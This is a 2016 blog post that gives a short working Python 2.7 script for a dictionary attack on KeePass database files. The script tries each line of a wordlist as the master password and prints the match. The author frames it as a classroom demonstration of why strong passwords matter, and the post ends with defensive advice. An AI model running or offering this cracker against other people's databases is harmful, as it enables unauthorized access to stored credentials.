---
id: 425
title: KeePass Dictionary Attack
date: 2016-01-02T00:44:40+00:00
author: Josh
layout: post
guid: https://blog.joshdawes.com/?p=425
permalink: /keepass-dictionary-attack/
image: /wp-content/uploads/2016/01/keepass-dictionary-attack.png
categories:
  - Python
  - Security
---
## Update

Python 3 version can be found on <a href="https://github.com/0x6A6F7368/KeePassDictionaryAttack" target="_blank" rel="noreferrer noopener">GitHub</a>.

Updated page can be viewed [here](https://blog.joshdawes.com/python-3-keepass-dictionary-attack/).

## KeePass Dictionary Attack &#8211; Python 2.7

<pre class="wp-block-preformatted">import libkeepass

filename = 'sample.kdbx' # Enter name of keepass database
f = open('passwords.txt') # Enter name of password list

for line in f:
    line = line.strip()
    try:
        with libkeepass.open(filename, password=line) as kdb:
            print '\n \n Password has been found. Your password is ' + `line`
            break
    except IOError:
        print 'Trying password:  ' + line</pre>

I wrote this script for a class I was teaching on using Password Managers. Even though we were implementing a Password Manager, some students still insisted on using simple passwords, thus leaving their password manager vulnerable to a simple dictionary attack. It is by no means an elaborate script, but was enough to outline to my students why we should use strong passwords to protect sensitive data.

<div class="wp-block-image wp-image-116 size-full">
  <figure class="aligncenter"><img src="https://blog.joshdawes.com/wp-content/uploads/2016/01/keepass-dictionary-attack.png" alt="Keepass Dictionary Attack" class="wp-image-116" /><figcaption>The KeePass Dictionary Attack script displaying the password found for a KeePass database.</figcaption></figure>
</div>

To use this script you will need access to a wordlist. There are many wordlists around and a quick Google search for &#8216;wordlist&#8217; will link you to several.&nbsp;A list of the top 500 worst passwords can be found <a href="https://gist.github.com/djaiss/4033452" target="_blank" rel="noreferrer noopener">here</a>.

You will also need to download and install the <a href="https://github.com/phpwutz/libkeepass" target="_blank" rel="noreferrer noopener">libkeepass </a>module. To install this module you may also need to download <a href="https://www.microsoft.com/en-us/download/details.aspx?id=44266" target="_blank" rel="noreferrer noopener">Microsoft Visual C++ compiler </a>for Python 2.7.

The KeePass Dictionary Attack script will cycle though the lines of the password list and then display the password if it finds a match. This password will then let you open an view passwords stored in the database. Currently, there is no message displayed if the password isn&#8217;t found.

## Protecting yourself

A KeePass dictionary using the default values can be attacked a fairly reasonable pace &#8211; depending on the speed of the attacking PC of course.

To help protect against a KeePass Dictionary Attack you can try some of the options found <a href="http://keepass.info/help/base/security.html#secdictprotect" target="_blank" rel="noreferrer noopener">here</a> &#8211; this doesn&#8217;t prevent an attacker running this script but does dramatically slow the attacker down.

## Dictionary Attack

A dictionary attack is when an attacker uses a wordlist of common passwords to attempt entry into your account/devices/files/etc. This is often successful due to people using simple dictionary words for passwords &#8211; to avoid this kind of attack ensure you use [long, unique passwords](https://blog.joshdawes.com/diceware-passphrase-generator/).